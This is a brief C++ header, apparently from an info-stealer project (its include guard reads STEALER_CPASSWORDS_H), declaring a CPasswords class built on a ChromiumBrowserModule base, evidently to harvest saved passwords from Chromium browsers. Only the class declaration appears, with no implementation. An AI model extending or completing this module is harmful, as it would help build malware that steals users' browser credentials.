//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_CPASSWORDS_H
#define STEALER_CPASSWORDS_H


#include "../ChromiumBrowserModule.h"

class CPasswords : public ChromiumBrowserModule {
public:
    void execute(const fs::path &root, const std::string &name, const fs::path &path) override;
};


#endif //STEALER_CPASSWORDS_H
